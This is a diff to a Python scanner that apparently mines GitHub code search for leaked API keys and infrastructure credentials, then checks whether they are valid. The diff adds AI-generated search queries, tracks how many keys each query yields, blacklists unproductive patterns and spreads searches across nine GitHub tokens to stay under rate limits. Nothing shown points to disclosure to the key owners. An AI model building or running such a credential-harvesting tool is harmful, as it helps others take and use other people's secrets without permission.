@@ -37,11 +37,33 @@ from infra_patterns import INFRA_EXTRACTORS, assess_risk, extract_destination
 from validators import validate, INFRA_VALIDATORS
 from notifier import notify_found, notify_cycle_done, notify_infra_found, notify_dead_token
 
-# Intersecting track: AI queries are the search vector; infra extractors run
-# on the same files. This guarantees infra creds come only from AI-related repos.
-ALL_QUERIES = QUERIES
-
 log = logging.getLogger(__name__)
+
+
+def get_active_queries() -> list[tuple]:
+    """Static QUERIES + DB-stored dynamic_queries (last 15d, not blacklisted).
+
+    Returns 4-tuples: (query_str, provider, file_type, query_hash). Static
+    rows carry query_hash=None — that disables per-query yield tracking
+    (we don't aggregate stats for the 1562 baseline patterns). Dynamic rows
+    carry their query_hash so the worker can update items_returned /
+    keys_found / valid_keys_found after each search exhaustion.
+
+    Called fresh at the start of every cycle so newly-generated queries
+    from the 8h rotation/themer loops enter rotation immediately."""
+    out: list[tuple] = [
+        (q[0], q[1], q[2], None) for q in QUERIES   # static — no hash
+    ]
+    try:
+        rows = db.get_active_dynamic_queries(max_age_days=15)
+        out.extend([
+            (r["query_str"], r["provider"], r["file_type"], r["query_hash"])
+            for r in rows
+        ])
+    except Exception as e:
+        log.error("get_active_queries: failed to load dynamic queries: %s", e)
+    return out
+
 
 # ── Token health tracking ──────────────────────────────────────────────────────
 # Updated by _check_quota; read by /health endpoint and dead-token alert.
@@ -617,7 +639,29 @@ async def _run_chunk(client: httpx.AsyncClient,
 
     queries_done = 0
 
-    for query_str, provider, file_type in queries:
+    for query_tuple in queries:
+        # Backwards-compat: support both 3-tuple (legacy) and 4-tuple shapes.
+        if len(query_tuple) == 4:
+            query_str, provider, file_type, query_hash = query_tuple
+        else:
+            query_str, provider, file_type = query_tuple
+            query_hash = None
+
+        # Per-query yield counters — reported back to dynamic_queries so the
+        # generator/themer can blacklist dead patterns and feed positive
+        # examples to the next AI batch.
+        items_returned_total = 0
+        keys_found_before    = 0
+        valid_found_before   = 0
+        if query_hash:
+            try:
+                stats_before = db.get_stats()
+                # Track aggregate; per-query attribution comes via Δ at end
+                keys_found_before  = stats_before.get("keys_found", 0)
+                valid_found_before = stats_before.get("keys_valid", 0)
+            except Exception:
+                pass
+
         if queries_done % 10 == 0 and queries_done > 0:
             search_q, core_q = await _check_quota(client, hdrs, token)
             if search_q == -2:
@@ -653,6 +697,7 @@ async def _run_chunk(client: httpx.AsyncClient,
             if not items:
                 break
 
+            items_returned_total += len(items)
             tasks = [
                 asyncio.create_task(
                     process_item(client, item, provider, file_type, sem, hdrs)
@@ -669,6 +714,32 @@ async def _run_chunk(client: httpx.AsyncClient,
 
             await asyncio.sleep(2)  # between pages — secondary rate-limit buffer
 
+        # Yield-tracking: only for dynamic queries (those with a hash).
+        # Δ-based attribution is approximate (other workers may insert keys
+        # concurrently) but biased correctly over time — patterns that return
+        # 0 items consistently will eventually accumulate to dead-pattern
+        # blacklist threshold (5+ uses, 0 keys_found).
+        if query_hash:
+            try:
+                stats_after = db.get_stats()
+                k_delta = max(0, stats_after.get("keys_found", 0) - keys_found_before)
+                v_delta = max(0, stats_after.get("keys_valid", 0) - valid_found_before)
+                # Cross-attribution noise: clamp to plausible per-query range.
+                # 9 workers running in parallel — divide deltas by N as a
+                # rough heuristic to avoid over-attributing concurrent finds.
+                n_workers = max(1, len(GITHUB_TOKENS))
+                k_attr = k_delta // n_workers
+                v_attr = v_delta // n_workers
+                db.record_query_usage(
+                    query_hash,
+                    items_returned=items_returned_total,
+                    keys_found=k_attr,
+                    valid_keys_found=v_attr,
+                )
+            except Exception as e:
+                log.debug("[w%d] yield-track err for %s: %s",
+                          worker_id, query_hash[:12], e)
+
         queries_done += 1
         await asyncio.sleep(2)  # between queries — keeps token at ≤30 req/min
 
@@ -677,14 +748,19 @@ async def _run_chunk(client: httpx.AsyncClient,
 
 async def run_cycle():
     n = len(GITHUB_TOKENS)
+    # Resolve the active query list FRESH each cycle so freshly-generated
+    # dynamic queries from the 8h rotation/themer loops show up immediately.
+    all_queries = get_active_queries()
+    static_n  = sum(1 for q in all_queries if len(q) == 4 and q[3] is None)
+    dynamic_n = len(all_queries) - static_n
     chunks: list[list] = [[] for _ in range(n)]
-    for i, q in enumerate(ALL_QUERIES):
+    for i, q in enumerate(all_queries):
         chunks[i % n].append(q)
 
     log.info(
-        "=== scan cycle start | %d tokens | %d AI queries → %s chunks | "
+        "=== scan cycle start | %d tokens | %d queries (%d static + %d dynamic) -> %s chunks | "
         "%d concurrent items | max %d pages | cross-extract: %d infra providers ===",
-        n, len(ALL_QUERIES), [len(c) for c in chunks],
+        n, len(all_queries), static_n, dynamic_n, [len(c) for c in chunks],
         CONCURRENT_ITEMS, MAX_PAGES, len(INFRA_EXTRACTORS),
     )
 
